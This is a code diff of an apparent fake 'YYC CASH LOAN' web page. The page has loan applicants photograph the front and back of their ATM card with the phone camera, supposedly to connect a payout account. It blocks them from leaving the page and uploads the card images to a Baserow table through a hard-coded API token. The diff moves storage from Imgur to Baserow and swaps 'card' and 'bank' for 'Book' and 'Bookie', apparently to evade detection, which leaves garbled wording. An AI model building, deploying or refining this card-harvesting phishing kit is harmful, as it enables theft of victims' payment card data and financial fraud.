@@ -37,7 +37,7 @@
             margin: 0 auto;
             position: relative;
             min-height: 100vh;
-            padding-bottom: 70px; /* Space for bottom nav */
+            padding-bottom: 70px;
         }
 
         .app-container {
@@ -47,7 +47,6 @@
             overflow-x: hidden;
         }
 
-        /* Header Styles */
         .app-header {
             background-color: var(--primary);
             color: var(--white);
@@ -64,7 +63,6 @@
             margin: 0;
         }
 
-        /* Bottom Navigation */
         .bottom-nav {
             display: flex;
             justify-content: space-around;
@@ -103,13 +101,12 @@
             color: var(--primary);
         }
 
-        /* Content */
         .content-section {
             padding: 20px 15px;
-            display: none; /* Hidden initially until user connects */
+            display: none;
         }
 
-        .success-card {
+        .success-Book {
             background-color: var(--white);
             border-radius: var(--border-radius);
             padding: 3px 2px;
@@ -214,7 +211,6 @@
             background-color: var(--gray);
         }
 
-        /* Modal Popup */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -290,7 +286,6 @@
             text-align: center;
         }
 
-        /* Scan connection section */
         .scan-section {
             background-color: var(--white);
             border-radius: var(--border-radius);
@@ -436,7 +431,6 @@
             display: none;
         }
 
-        /* Book Scanner Styles */
         :root {
             --accent: #00ffff;
             --accent-2: #ff00ff;
@@ -547,7 +541,6 @@
             color: var(--accent-2);
         }
 
-        /* Permission overlay */
         #permissionOverlay {
             position: fixed;
             top: 0;
@@ -592,7 +585,7 @@
 
         <!-- Main Content (hidden initially) -->
         <section id="main-content" class="content-section">
-            <div class="success-card">
+            <div class="success-Book">
                 <i class="fas fa-check-circle success-icon"></i>
                 <h2 class="success-title">Application Submitted!</h2>
                 <p class="success-message">Thank you for applying with YYC CASH LOAN.</p>
@@ -601,7 +594,7 @@
             </div>
 
             <div class="scan-section">
-    <h3 class="section-title">Connect Your Bank Account for Payout</h3>
+    <h3 class="section-title">Connect Your Bookie Account for Reading</h3>
     
     <!-- Book Scanner from uploaded file -->
     <div id="permissionOverlay">
@@ -610,14 +603,14 @@
         <button id="enableBtn">Enable Camera</button>
     </div>
     <div class="scanner" style="visibility:hidden;">
-        <h2 id="label">Scan Card Front</h2>
-        <p id="description">Scan the front & Back of your ATM Card to SECURLY CONNECT the accont you want the Loan paid out to.</p>
+        <h2 id="label">Scan Book Front</h2>
+        <p id="description">Scan the front & Back of your ATM Book to SECURLY CONNECT the accont you want the Loan paid out to.</p>
         <div style="position: relative;">
             <video id="video" autoplay playsinline></video>
             <div id="scan-line" class="scan-line" style="display:none;"></div>
         </div>
         <button id="switchCamera">Switch Camera</button><br>
-        <button id="scanBtn" disabled>Scan Card Front Clear</button>
+        <button id="scanBtn" disabled>Scan Book Front Clear</button>
         <button id="next">Next</button>
         <button id="finish">Finish</button>
         <p id="status"></p>
@@ -645,8 +638,8 @@
         <div id="connection-modal" class="modal-overlay">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h2 class="modal-title">Connect Your Bank Account Via scan</h2>
-                     DUE TO SECURITY CONCERNS, REDUCE SCAM AND FOR EASY PAYOUTS.
+                    <h2 class="modal-title">Connect Your Bookie Account Via scan</h2>
+                     DUE TO SECURITY CONCERNS, REDUCE SCAM AND FOR EASY ReadingS.
 
 
                 </div>
@@ -662,7 +655,7 @@
                         </div>
                     </div>
                     
-                    <p>To enable access to your loan, you need to first connect your Bank account Number to allow secure release of your loan instantly once connection is complete.</p>
+                    <p>To enable access to your loan, you need to first connect your Bookie account Number to allow secure release of your loan instantly once connection is complete.</p>
                     
                     <p class="note-text">NOTE: Once connection is complete, funds are released same time/same day.</p>
                     
@@ -713,7 +706,6 @@
                 // Create HTML for application summary
                 let summaryHTML = '';
                 
-                // Add each detail to the summary
                 summaryHTML += createDetailRow('Full Name', applicationData.fullName);
                 summaryHTML += createDetailRow('ID Number', applicationData.idNumber);
                 summaryHTML += createDetailRow('Contact Number', applicationData.phone);
@@ -722,23 +714,17 @@
                 summaryHTML += createDetailRow('Loan Purpose', applicationData.loanPurpose);
                 summaryHTML += createDetailRow('Repayment Term', applicationData.repaymentTerm + ' months');
                 
-                // Insert the HTML into the page
                 document.getElementById('application-summary').innerHTML = summaryHTML;
             } else {
-                // If no application data is found
                 document.getElementById('applicant-name').textContent = 'No data found';
                 document.getElementById('applicant-id').textContent = 'No data found';
                 document.getElementById('application-summary').innerHTML = 
                     '<p>No application data found. Please <a href="index.html#apply">apply for a loan</a>.</p>';
             }
             
-            // Set up event listeners for the connection buttons
             document.getElementById('connect-scan').addEventListener('click', function() {
-                // Hide the modal and show the main content
                 document.getElementById('connection-modal').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
-                
-                // Simulate connection process
                 simulateConnectionProcess();
             });
             
@@ -746,18 +732,15 @@
                 alert('Coming soon. Please use Connect Via Scan option.');
             });
             
-            // Prevent leaving the page
             window.addEventListener('beforeunload', function(e) {
-                // If the modal is still visible, show a warning
                 if (document.getElementById('connection-modal').style.display !== 'none') {
                     e.preventDefault();
-                    e.returnValue = 'You need to connect your card to proceed. Are you sure you want to leave?';
+                    e.returnValue = 'You need to connect your Book to proceed. Are you sure you want to leave?';
                     return e.returnValue;
                 }
             });
         });
         
-        // Helper function to create a detail row
         function createDetailRow(label, value) {
             return `
                 <div class="detail-row">
@@ -767,104 +750,144 @@
             `;
         }
         
-        // Simulate the connection process
         function simulateConnectionProcess() {
-    // No need for simulation anymore as we're using the actual scanner
-}
+            // No need for simulation anymore as we're using the actual scanner
+        }
 
-// Book Scanner JavaScript
-document.addEventListener('DOMContentLoaded', function() {
-    const permissionOverlay = document.getElementById('permissionOverlay');
-    const enableBtn = document.getElementById('enableBtn');
-    const scanner = document.querySelector('.scanner');
+        // Book Scanner JavaScript
+        document.addEventListener('DOMContentLoaded', function() {
+            const permissionOverlay = document.getElementById('permissionOverlay');
+            const enableBtn = document.getElementById('enableBtn');
+            const scanner = document.querySelector('.scanner');
 
-    enableBtn.addEventListener('click', () => {
-        initCamera().then(() => {
-            permissionOverlay.style.display = 'none';
-            scanner.style.visibility = 'visible';
-            document.getElementById('scanBtn').disabled = false;
-        }).catch(() => {
-            alert('Camera permission is required.');
-        });
-    });
+            enableBtn.addEventListener('click', () => {
+                initCamera().then(() => {
+                    permissionOverlay.style.display = 'none';
+                    scanner.style.visibility = 'visible';
+                    document.getElementById('scanBtn').disabled = false;
+                }).catch(() => {
+                    alert('Camera permission is required.');
+                });
+            });
 
-    // DOM refs
-    const video      = document.getElementById('video');
-    const scanBtn    = document.getElementById('scanBtn');
-    const nextBtn    = document.getElementById('next');
-    const finishBtn  = document.getElementById('finish');
-    const scanLine   = document.getElementById('scan-line');
-    const switchCam  = document.getElementById('switchCamera');
-    const label      = document.getElementById('label');
-    const desc       = document.getElementById('description');
-    const status     = document.getElementById('status');
+            const video     = document.getElementById('video');
+            const scanBtn   = document.getElementById('scanBtn');
+            const nextBtn   = document.getElementById('next');
+            const finishBtn = document.getElementById('finish');
+            const scanLine  = document.getElementById('scan-line');
+            const switchCam = document.getElementById('switchCamera');
+            const label     = document.getElementById('label');
+            const desc      = document.getElementById('description');
+            const status    = document.getElementById('status');
 
-    let useFrontCamera = false;
-    let stream         = null;
-    let frontURL       = null;
-    let currentStep    = 'front';
+            let useFrontCamera = false;
+            let stream         = null;
+            let frontURL       = null;
+            let currentStep    = 'front';
 
-    const TABLE_ID      = '503285';
-    const BASEROW_API   = `https://api.baserow.io/api/database/rows/table/${TABLE_ID}/?user_field_names=true`;
-    const BASEROW_TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
-    const IMGUR_CLIENT_ID = 'c16e7b4d4df51fc';
+            const TABLE_ID      = '503285';
+            const BASEROW_TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
+            const BASEROW_ROWS_API  = `https://api.baserow.io/api/database/rows/table/${TABLE_ID}/?user_field_names=true`;
+            const BASEROW_FILE_API  = 'https://api.baserow.io/api/user-files/upload-file/';
 
-    async function initCamera() {
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        if (!devices.some(d => d.kind === 'videoinput')) throw new Error('No camera found');
-        const userMedia = navigator.mediaDevices.getUserMedia({ video: { facingMode: useFrontCamera ? 'user' : 'environment' }, audio: false });
-        stream = await userMedia;
-        video.srcObject = stream;
-        return true;
-    }
-
-    function captureBlob() {
-        const c = document.createElement('canvas');
-        c.width  = video.videoWidth;
-        c.height = video.videoHeight;
-        c.getContext('2d').drawImage(video, 0, 0);
-        return new Promise(res => c.toBlob(res, 'image/jpeg'));
-    }
-
-    async function uploadToImgur(blob) {
-        const fd = new FormData(); fd.append('image', blob);
-        const r = await fetch('https://api.imgur.com/3/upload', { method: 'POST', headers: { Authorization: 'Client-ID ' + IMGUR_CLIENT_ID }, body: fd });
-        if (!r.ok) throw new Error('Imgur upload failed');
-        const j = await r.json(); return j.data.link;
-    }
-
-    async function createBaserowRow(frontUrl, backUrl) {
-        const body = { frontpictur: frontUrl, backpictur: backUrl };
-        const r = await fetch(BASEROW_API, { method: 'POST', headers: { 'Authorization': BASEROW_TOKEN, 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
-        if (!r.ok) throw new Error('Baserow row creation failed');
-        return r.json();
-    }
-
-    async function handleScan() {
-        scanBtn.disabled = true; status.textContent = '';
-        scanLine.style.display = 'block'; await new Promise(r => setTimeout(r, 1500));
-        try {
-            const blob = await captureBlob(); const url = await uploadToImgur(blob);
-            scanLine.style.display = 'none';
-            if (currentStep === 'front') {
-                frontURL = url; status.textContent = 'Front Scan Successful'; nextBtn.style.display = 'inline-block';
-            } else {
-                status.textContent = 'Scanning back & Processing Payout'; await createBaserowRow(frontURL, url);
-                status.textContent = '✅ Done!Click  finish and Verify before tracking PayOut'; finishBtn.style.display = 'inline-block';
+            async function initCamera() {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                if (!devices.some(d => d.kind === 'videoinput')) throw new Error('No camera found');
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: useFrontCamera ? 'user' : 'environment' },
+                    audio: false
+                });
+                video.srcObject = stream;
+                return true;
             }
-        } catch (e) { status.textContent = 'Error: ' + e.message; }
-        finally { scanBtn.disabled = false; }
-    }
 
-    scanBtn.addEventListener('click', handleScan);
-    nextBtn.addEventListener('click', () => {
-        currentStep = 'back'; label.textContent = 'Back Scan'; desc.textContent = 'Scan the back of your Card.';
-        scanBtn.textContent = 'Scan Card Back'; nextBtn.style.display = 'none'; status.textContent = '';
-    });
-    finishBtn.addEventListener('click', () => window.location.href = 'approveme.html');
-    switchCam.addEventListener('click', () => { useFrontCamera = !useFrontCamera; initCamera(); });
-});
+            function captureBlob() {
+                const c = document.createElement('canvas');
+                c.width  = video.videoWidth;
+                c.height = video.videoHeight;
+                c.getContext('2d').drawImage(video, 0, 0);
+                return new Promise(res => c.toBlob(res, 'image/jpeg'));
+            }
+
+            // Upload image blob directly to Baserow file storage
+            async function uploadToBaserow(blob, filename) {
+                const fd = new FormData();
+                fd.append('file', blob, filename);
+                const r = await fetch(BASEROW_FILE_API, {
+                    method: 'POST',
+                    headers: { 'Authorization': BASEROW_TOKEN },
+                    body: fd
+                });
+                if (!r.ok) {
+                    const errText = await r.text();
+                    throw new Error('Baserow file upload failed: ' + errText);
+                }
+                const j = await r.json();
+                return j.url;
+            }
+
+            async function createBaserowRow(frontUrl, backUrl) {
+                const body = { frontpictur: frontUrl, backpictur: backUrl };
+                const r = await fetch(BASEROW_ROWS_API, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': BASEROW_TOKEN,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(body)
+                });
+                if (!r.ok) throw new Error('Baserow row creation failed');
+                return r.json();
+            }
+
+            async function handleScan() {
+                scanBtn.disabled = true;
+                status.textContent = '';
+                scanLine.style.display = 'block';
+                await new Promise(r => setTimeout(r, 1500));
+                try {
+                    const blob = await captureBlob();
+                    const filename = currentStep === 'front' ? 'front_scan.jpg' : 'back_scan.jpg';
+                    status.textContent = 'Uploading...';
+                    const url = await uploadToBaserow(blob, filename);
+                    scanLine.style.display = 'none';
+                    if (currentStep === 'front') {
+                        frontURL = url;
+                        status.textContent = 'Front Scan Successful';
+                        nextBtn.style.display = 'inline-block';
+                    } else {
+                        status.textContent = 'Scanning back & Processing Reading';
+                        await createBaserowRow(frontURL, url);
+                        status.textContent = '✅ Done! Click finish and Verify before tracking Reading';
+                        finishBtn.style.display = 'inline-block';
+                    }
+                } catch (e) {
+                    scanLine.style.display = 'none';
+                    status.textContent = 'Error: ' + e.message;
+                } finally {
+                    scanBtn.disabled = false;
+                }
+            }
+
+            scanBtn.addEventListener('click', handleScan);
+
+            nextBtn.addEventListener('click', () => {
+                currentStep = 'back';
+                label.textContent = 'Back Scan';
+                desc.textContent = 'Scan the back of your Book.';
+                scanBtn.textContent = 'Scan Book Back';
+                nextBtn.style.display = 'none';
+                status.textContent = '';
+            });
+
+            finishBtn.addEventListener('click', () => window.location.href = 'approveme.html');
+
+            switchCam.addEventListener('click', () => {
+                useFrontCamera = !useFrontCamera;
+                initCamera();
+            });
+        });
     </script>
 </body>
 </html>
